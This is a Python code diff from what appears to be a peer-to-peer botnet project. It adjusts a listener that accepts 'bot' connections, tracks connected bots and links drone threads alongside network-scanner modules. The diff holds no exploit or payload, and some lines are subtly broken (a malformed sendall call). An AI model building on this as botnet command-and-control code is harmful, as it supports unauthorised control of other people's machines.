@@ -7,13 +7,14 @@ from ..scanner_cogs import *
 from ..scanner_cogs import neighborhood_scanner
 from ..scanner_cogs import ip_range
 from .. scanner_cogs import get_ip
+from ..head_recv import *
 local_net = []
 lhost = get_ip.get_ip()
-currently_connected_bots = {}
+currently_connected_bots = []
 
 def p2p_welcomer(server):
     while True:
-        server.listen(2)
+        server.listen(10)
         print("SERVER LISTENING")
         conn, addr = server.accept()
         print(f"BOT_CONNECTED:{conn}, {addr}")
@@ -24,14 +25,12 @@ def p2p_welcomer(server):
                 link_drone_thread.start()
 
 def link(conn):
-    conn.settimeout(10)
+    print("STARTED INCOMING LINK")
+    conn.settimeout(5)
     disconnection_counter = 0
     waiting_for_info = True
     while waiting_for_info == True:
-        net_link = conn.recv(2048)
-        if net_link:
-            print(net_link)
-        time.sleep(0.1)
+        net_link = head_recv(conn)
         if net_link:
             print(net_link)
         elif not net_link:
@@ -41,6 +40,7 @@ def link(conn):
                 conn.sendall("conn_test", "utf-8")
                 disconnection_counter = 0
             except:
+                print("INCOMING_LINK_DISCONNECTED")
                 try:
                     conn.shutdown(2)
                 except:
